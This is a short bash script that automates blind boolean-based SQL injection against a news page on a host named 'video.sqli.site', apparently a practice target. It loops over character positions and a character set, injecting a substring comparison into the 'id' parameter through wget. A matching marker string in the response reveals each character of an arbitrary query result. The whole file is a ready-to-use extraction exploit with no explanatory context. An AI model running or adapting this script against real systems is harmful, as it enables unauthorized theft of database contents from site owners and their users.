#!/bin/bash

charset=`echo {0..9} {A..z} \. \: \, \; \- \_ \@`

export URL="http://1.video.sqli.site/newsdetails.php"
export truestring="neque sed dictum"
export maxlength=$1
export query=$2

export result=""

echo "Extracting the results for $query..."

for ((j=1;j<$maxlength;j+=1))
do
        export nthchar=$j

        for i in $charset
        do
                wget "$URL?id=26' and substring(($query),$nthchar,1)='$i" -q -O - |grep "$truestring" &> /dev/null
                if [ "$?" == "0" ]
                then
                        echo Character number $nthchar found: $i
                        export result+=$i
                        break
                fi
        done
done

echo Result: $result
